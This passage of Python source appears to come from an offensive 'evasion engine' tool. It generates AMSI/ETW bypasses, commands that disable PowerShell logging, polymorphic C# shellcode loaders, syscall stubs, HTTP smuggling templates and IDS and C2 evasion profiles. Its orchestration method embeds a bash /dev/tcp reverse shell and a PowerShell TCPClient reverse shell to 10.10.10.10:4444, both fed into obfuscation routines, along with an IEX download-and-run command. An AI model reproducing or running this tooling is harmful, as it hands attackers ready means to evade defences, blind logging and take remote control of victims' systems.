        self.results['loaders'].append(artifact)
        self._print('gen', f'Shellcode {scheme} encoded — '
                            f'len={len(shellcode)} key={key.hex()[:16]}')
        return artifact

    # ─────────────────────────────────────────────────────────
    #  5.  AMSI / ETW BYPASS LIBRARY
    # ─────────────────────────────────────────────────────────
    def get_bypass_snippets(self) -> List[Dict[str, str]]:
        self._print('info', 'Compiling AMSI / ETW bypass library...')
        snippets: List[Dict[str, str]] = []
        for name, code in AMSI_BYPASS_LIBRARY.items():
            snippets.append({'category': 'AMSI', 'name': name, 'code': code})
            self._print('gen', f'AMSI {M}{name}{X}')
        for name, code in ETW_BYPASS_LIBRARY.items():
            snippets.append({'category': 'ETW', 'name': name, 'code': code})
            self._print('gen', f'ETW  {M}{name}{X}')

        # Execution policy bypass variants
        for ep in [
            'powershell -ExecutionPolicy Bypass -File <script>',
            'powershell -ep bypass -enc <b64>',
            'powershell -c "Set-ExecutionPolicy -Scope Process Bypass; . \\".\\\\s.ps1\\""',
            'cmd /c "powershell -nop -ep bypass -c IEX(IWR http://… -UseBasicParsing)"',
            'Unblock-File s.ps1; .\\s.ps1',
        ]:
            snippets.append({'category': 'ExecutionPolicy', 'name': 'bypass', 'code': ep})

        # ScriptBlock logging tampering
        snippets.append({'category': 'Logging', 'name': 'sblock_logging_off',
                          'code': r'Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0'})
        # Module logging off
        snippets.append({'category': 'Logging', 'name': 'module_logging_off',
                          'code': r'Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0'})

        self.results['bypass_snippets'] = snippets
        return snippets

    # ─────────────────────────────────────────────────────────
    #  6.  POLYMORPHIC C# LOADER GENERATION
    # ─────────────────────────────────────────────────────────
    def generate_cs_loader(self, loader_type: str = 'pinvoke_basic',
                           shellcode: bytes = b'\x90\x90\xCC',
                           scheme: str = 'xor') -> Dict[str, Any]:
        loader_type = loader_type if loader_type in CS_LOADER_TEMPLATES else 'pinvoke_basic'
        if scheme == 'xor':
            key = bytes([random.choice(self.XOR_KEYS_DEFAULT)])
        else:
            key = secrets.token_bytes(16)
        encoded = (_xor_bytes(shellcode, key) if scheme == 'xor'
                    else _rc4(key, shellcode))

        sc_bytes = ', '.join(f'0x{b:02x}' for b in encoded)
        key_bytes = ', '.join(f'0x{b:02x}' for b in key)
        cls_name = 'C' + _rand_id(8)
        var_enc = '_' + _rand_id(6)
        var_key = '_' + _rand_id(6)
        var_mem = '_' + _rand_id(6)
        var_t   = '_' + _rand_id(6)

        code = CS_LOADER_TEMPLATES[loader_type].format(
            CLASS_NAME=cls_name,
            SHELLCODE_BYTES=sc_bytes,
            KEY_BYTES=key_bytes,
            VAR_ENC=var_enc, VAR_KEY=var_key,
            VAR_MEM=var_mem, VAR_T=var_t,
        )
        filename = os.path.join(self.out_dir,
                                f'loader_{loader_type}_{cls_name}.cs')
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(code)
        compile_cmd = (f'csc /unsafe /platform:x64 '
                       f'/out:{filename.replace(".cs", ".exe")} {filename}')
        artifact = {
            'type': loader_type, 'scheme': scheme,
            'class': cls_name, 'filename': filename,
            'compile_cmd': compile_cmd,
            'shellcode_sha256': hashlib.sha256(shellcode).hexdigest(),
            'encoded_sha256': hashlib.sha256(encoded).hexdigest(),
        }
        self.results['loaders'].append(artifact)
        self._print('gen', f'C# loader {M}{loader_type}{X} → {G}{filename}{X}')
        return artifact

    # ─────────────────────────────────────────────────────────
    #  7.  SYSCALL STUBS (Hell's / Halo's / Tartarus' Gate)
    # ─────────────────────────────────────────────────────────
    def generate_syscall_stubs(self) -> List[Dict[str, str]]:
        self._print('info', 'Emitting syscall stub references...')
        stubs = [
            {'name': 'hells_gate',    'language': 'C', 'code': HELLS_GATE_C},
            {'name': 'halos_gate',    'language': 'C', 'code': HALOS_GATE_C},
            {'name': 'tartarus_gate', 'language': 'C', 'code': TARTARUS_GATE_C},
        ]
        for s in stubs:
            path = os.path.join(self.out_dir, f'syscalls_{s["name"]}.c')
            with open(path, 'w', encoding='utf-8') as f:
                f.write(s['code'])
            s['filename'] = path
            self._print('gen', f'Syscall stub {M}{s["name"]}{X} → {G}{path}{X}')
        self.results['syscall_stubs'] = stubs
        return stubs

    # ─────────────────────────────────────────────────────────
    #  8.  TLS / JA3 PROFILES
    # ─────────────────────────────────────────────────────────
    def get_tls_profiles(self) -> List[Dict[str, Any]]:
        self._print('info', 'Loading TLS / JA3 reshaping profiles...')
        profiles: List[Dict[str, Any]] = []
        for name, prof in JA3_PROFILES.items():
            entry = {'name': name, **prof}
            profiles.append(entry)
            self._print('gen', f'JA3 profile {M}{name}{X} '
                                f'→ ja3_md5={prof["reference_ja3"]}')
        self.results['tls_profiles'] = profiles
        return profiles

    # ─────────────────────────────────────────────────────────
    #  9.  HTTP REQUEST SMUGGLING
    # ─────────────────────────────────────────────────────────
    def get_smuggling_templates(self, host: str = 'TARGET') -> List[Dict[str, str]]:
        self._print('info', 'Compiling HTTP request smuggling templates...')
        out: List[Dict[str, str]] = []
        for name, tmpl in HTTP_SMUGGLING_TEMPLATES.items():
            payload = tmpl.format(HOST=host) if '{HOST}' in tmpl else tmpl
            out.append({'variant': name, 'payload': payload})
            self._print('gen', f'Smuggling {M}{name}{X}')
        self.results['smuggling_templates'] = out
        return out

    # ─────────────────────────────────────────────────────────
    #  10. SLEEP MASK / TIMING OBFUSCATION
    # ─────────────────────────────────────────────────────────
    def get_sleep_masks(self) -> List[Dict[str, str]]:
        self._print('info', 'Compiling sleep-mask references...')
        out = [{'name': n, 'description': d} for n, d in SLEEP_MASK_TEMPLATES.items()]
        self.results['sleep_masks'] = out
        for o in out:
            self._print('gen', f'Sleep mask {M}{o["name"]}{X}')
        return out

    # ─────────────────────────────────────────────────────────
    #  11. IDS / IPS EVASION
    # ─────────────────────────────────────────────────────────
    def generate_ids_evasion_guide(self, target: str = 'TARGET') -> List[Dict[str, str]]:
        self._print('info', 'Compiling IDS/IPS evasion command set...')
        guide: List[Dict[str, str]] = []
        for name, cmd in IDS_EVASION_COMMANDS.items():
            guide.append({'technique': name, 'command': cmd.format(TARGET=target)})
            self._print('gen', f'{M}{name}{X}: {C}{cmd}{X}')
        self.results['ids_techniques'] = guide
        return guide

    # ─────────────────────────────────────────────────────────
    #  12. C2 TRAFFIC CAMOUFLAGE PROFILES
    # ─────────────────────────────────────────────────────────
    def get_c2_traffic_profiles(self) -> List[Dict[str, Any]]:
        self._print('info', 'Compiling C2 traffic-camouflage profiles...')
        out = list(C2_TRAFFIC_PROFILES)
        for p in out:
            self._print('gen', f'C2 profile {M}{p["name"]}{X}: {p["desc"]}')
        self.results['c2_traffic_profiles'] = out
        return out

    # ─────────────────────────────────────────────────────────
    #  13. DOMAIN FRONTING NOTES
    # ─────────────────────────────────────────────────────────
    def get_domain_fronting_notes(self) -> List[Dict[str, str]]:
        self._print('info', 'Loading domain-fronting reference notes...')
        out = [{'cdn': k, 'note': v} for k, v in DOMAIN_FRONTING_NOTES.items()]
        self.results['domain_fronting'] = out
        return out

    # ─────────────────────────────────────────────────────────
    #  ORCHESTRATION
    # ─────────────────────────────────────────────────────────
    def run_full_evasion_suite(self,
                               sample_payload: Optional[str] = None,
                               sample_shellcode: bytes = b'\x90' * 32 + b'\xCC',
                               target: str = 'TARGET') -> Dict[str, Any]:
        print(f'\n{C}╔══════════════════════════════════════════════════════════╗{X}')
        print(f'{C}║{X} {B}{M}[EVASION ENGINE — INDUSTRIAL]{X} Output: {Y}{self.out_dir}{X}')
        print(f'{C}╚══════════════════════════════════════════════════════════╝{X}\n')

        if not sample_payload:
            sample_payload = 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'

        for method in ('base64', 'hex', 'xor', 'rc4', 'chain'):
            self.encode_payload(sample_payload, method)

        ps_cmd = ('$c=New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);'
                  '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};'
                  'while(($i=$s.Read($b,0,$b.Length)) -ne 0){'
                  ';$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
                  '$r=(iex $d 2>&1|Out-String);'
                  '$r2=$r+"PS "+\'> \';'
                  '$sb=([text.encoding]::ASCII).GetBytes($r2);'
                  '$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()')
        self.obfuscate_powershell(ps_cmd)
        self.obfuscate_bash(sample_payload)

        self.encode_shellcode(sample_shellcode, scheme='xor')
        self.encode_shellcode(sample_shellcode, scheme='rc4')

        self.get_bypass_snippets()
        for loader in ('pinvoke_basic', 'apc_injection', 'thread_reuse'):
            self.generate_cs_loader(loader, sample_shellcode, scheme='xor')

        self.generate_syscall_stubs()
        self.get_tls_profiles()
        self.get_smuggling_templates(target)
        self.get_sleep_masks()
        self.generate_ids_evasion_guide(target)
        self.get_c2_traffic_profiles()
        self.get_domain_fronting_notes()

        self.results['completed_at'] = datetime.now().isoformat()

        s = self.results
        print(f'\n{G}[✓]{X} Evasion suite complete — '
              f'{len(s["encoded_payloads"])} encodings | '
              f'{len(s["obfuscated_shells"])} obfuscated shells | '
              f'{len(s["bypass_snippets"])} bypass snippets | '
              f'{len(s["loaders"])} loaders | '
              f'{len(s["syscall_stubs"])} syscall stubs | '
              f'{len(s["tls_profiles"])} TLS profiles | '
              f'{len(s["smuggling_templates"])} smuggling templates | '
              f'{len(s["sleep_masks"])} sleep masks | '
              f'{len(s["c2_traffic_profiles"])} C2 traffic profiles')

        return self.results
